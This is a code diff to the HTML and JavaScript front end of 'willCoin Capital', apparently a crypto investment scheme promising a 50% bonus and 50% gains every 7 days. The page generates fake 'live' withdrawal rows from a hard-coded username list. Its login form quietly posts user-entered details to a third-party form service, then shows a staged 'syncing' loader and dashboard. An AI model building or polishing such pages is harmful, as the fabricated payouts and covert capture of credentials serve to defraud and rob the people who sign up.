@@ -13,7 +13,7 @@
         .modal-bg { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(10px); }
         .custom-scroll::-webkit-scrollbar { width: 4px; }
         .custom-scroll::-webkit-scrollbar-thumb { background: #22d3ee; border-radius: 10px; }
-        #dashboard.hidden, #main-terminal.hidden { display: none; }
+        #dashboard.hidden, #main-terminal.hidden, #loader.hidden { display: none; }
         input[type="range"] { -webkit-appearance: none; background: #1f2937; height: 4px; border-radius: 10px; width: 100%; }
         input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: #22d3ee; cursor: pointer; box-shadow: 0 0 15px rgba(34,211,238,0.7); }
         .support-float { position: fixed; bottom: 32px; right: 32px; z-index: 1000; }
@@ -23,9 +23,18 @@
             to { opacity: 1; transform: translateY(0); }
         }
         .new-row { animation: fadeInDown 0.6s ease-out forwards; }
+
+        /* Loader Animation */
+        .spinner { border: 3px solid rgba(34, 211, 238, 0.1); border-top: 3px solid #22d3ee; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
+    <div id="loader" class="hidden fixed inset-0 z-[2000] bg-[#020817] flex flex-col items-center justify-center">
+        <div class="spinner mb-4"></div>
+        <p class="text-cyan-400 font-black uppercase text-[10px] tracking-[0.3em] animate-pulse">Syncing Terminal...</p>
+    </div>
 
     <a href="https://t.me/willCoin_Capital" target="_blank" class="support-float flex items-center gap-3 bg-cyan-400 text-black px-8 py-4 rounded-full font-black uppercase text-[10px] tracking-widest btn-glow">
         <span class="w-2 h-2 rounded-full bg-black animate-pulse"></span>
@@ -109,8 +118,8 @@
                 <p>At willCoin Capital, we provide investors with a simple and transparent way to grow their digital assets.</p>
                 <div><h4 class="text-cyan-400 font-bold uppercase mb-1">1. Create Your Account</h4><p>Register a secure account on our platform in just a few steps.</p></div>
                 <div><h4 class="text-cyan-400 font-bold uppercase mb-1">2. Fund Your Investment</h4><p>Make a deposit into your investment wallet quickly and safely.</p></div>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">3. Receive a 50% Investment Bonus</h4><p>Every deposit automatically qualifies for a 50% bonus added to your active balance.</p></div>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">4. 7-Day Investment Cycle</h4><p>Each investment runs on a 7-day maturation cycle to generate returns.</p></div>
+                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">3. Receive a 50% Investment Bonus</h4><p>Every deposit automatically qualifies for a 50% bonus.</p></div>
+                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">4. 7-Day Investment Cycle</h4><p>Each investment runs on a 7-day maturation cycle.</p></div>
                 <div><h4 class="text-cyan-400 font-bold uppercase mb-1">5. Withdraw Your Capital + Profits</h4><p>At the end of the cycle, withdraw original capital plus 50% gains.</p></div>
                 <div><h4 class="text-cyan-400 font-bold uppercase mb-1">6. Reinvest or Withdraw</h4><p>Choose to withdraw earnings or reinvest to continue growing.</p></div>
             </div>
@@ -140,23 +149,31 @@
             modal.classList.remove('hidden');
         }
 
-        // Direct Dashboard Transition (No Pop-ups)
+        // --- UPDATED SYNC TRANSITION ---
         document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('authSubmit');
+            const loader = document.getElementById('loader');
+            
             btn.innerText = "AUTHENTICATING...";
             
-            // Submits in background
-            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
+            // Background Submission
+            fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
 
-            // Switch views instantly
+            // Show Loader Overlay
             document.getElementById('authModal').classList.add('hidden');
-            document.getElementById('main-terminal').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            window.scrollTo(0,0);
+            loader.classList.remove('hidden');
+
+            // Wait 1 second then transition
+            setTimeout(() => {
+                loader.classList.add('hidden');
+                document.getElementById('main-terminal').classList.add('hidden');
+                document.getElementById('dashboard').classList.remove('hidden');
+                window.scrollTo(0,0);
+            }, 1000);
         };
 
-        // Live Ledger Logic
+        // Live Ledger
         const usernames = ["Alpha_User", "0x4e...f2", "CryptoKing", "User_772", "Btc_Hunter", "0x9d...1a", "Whale_99", "Trader_X", "Elite_Node", "0x7c...b1"];
         const ledgerBody = document.getElementById('ledgerBody');
         function addNewWithdrawal() {
@@ -171,7 +188,7 @@
         for(let i=0; i<6; i++) { addNewWithdrawal(); }
         setInterval(addNewWithdrawal, 6000);
 
-        // Calculator Logic
+        // Calculator
         const input = document.getElementById('depositInput');
         const slider = document.getElementById('depositSlider');
         function updateCalc(val) {
@@ -184,4 +201,5 @@
     </script>
 </body>
 </html>
+
 
